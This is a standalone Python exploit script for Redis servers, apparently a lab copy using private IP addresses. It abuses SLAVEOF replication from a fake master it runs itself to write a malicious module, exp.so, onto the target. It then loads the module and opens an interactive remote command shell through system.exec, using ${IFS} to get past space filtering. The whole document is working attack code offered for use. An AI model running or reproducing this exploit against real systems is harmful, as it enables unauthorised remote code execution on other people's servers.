import socket
import time

CRLF = "\r\n"
payload = open("exp.so", "rb").read()
exp_filename = "exp.so"


def redis_format(arr):
    global CRLF
    global payload
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len(x)) + CRLF + x
    cmd += CRLF
    return cmd


def redis_connect(rhost, rport):
    sock = socket.socket()
    sock.connect((rhost, rport))
    return sock


def send(sock, cmd):
    sock.send(redis_format(cmd))
    print(sock.recv(1024).decode("utf-8"))


def interact_shell(sock):
    flag = True
    try:
        while flag:
            shell = input("\033[1;32;40m[*]\033[0m ")
            shell = shell.replace(" ", "${IFS}")
            if shell == "exit" or shell == "quit":
                flag = False
            else:
                send(sock, "system.exec {}".format(shell))
    except KeyboardInterrupt:
        return


def RogueServer(lport):
    global CRLF
    global payload
    flag = True
    result = ""
    sock = socket.socket()
    sock.bind(("0.0.0.0", lport))
    sock.listen(10)
    clientSock, address = sock.accept()
    while flag:
        data = clientSock.recv(1024)
        if "PING" in data:
            result = "+PONG" + CRLF
            clientSock.send(result)
            flag = True
        elif "REPLCONF" in data:
            result = "+OK" + CRLF
            clientSock.send(result)
            flag = True
        elif "PSYNC" in data or "SYNC" in data:
            result = "+FULLRESYNC " + "a" * 40 + " 1" + CRLF
            result += "$" + str(len(payload)) + CRLF
            result = result.encode()
            result += payload
            result += CRLF
            clientSock.send(result)
            flag = False


if __name__ == "__main__":
    lhost = "192.168.163.132"
    lport = 6666
    rhost = "192.168.163.128"
    rport = 6379
    passwd = ""
    redis_sock = redis_connect(rhost, rport)
    if passwd:
        send(redis_sock, "AUTH {}".format(passwd))
    send(redis_sock, "SLAVEOF {} {}".format(lhost, lport))
    send(redis_sock, "config set dbfilename {}".format(exp_filename))
    time.sleep(2)
    RogueServer(lport)
    send(redis_sock, "MODULE LOAD ./{}".format(exp_filename))
    interact_shell(redis_sock)
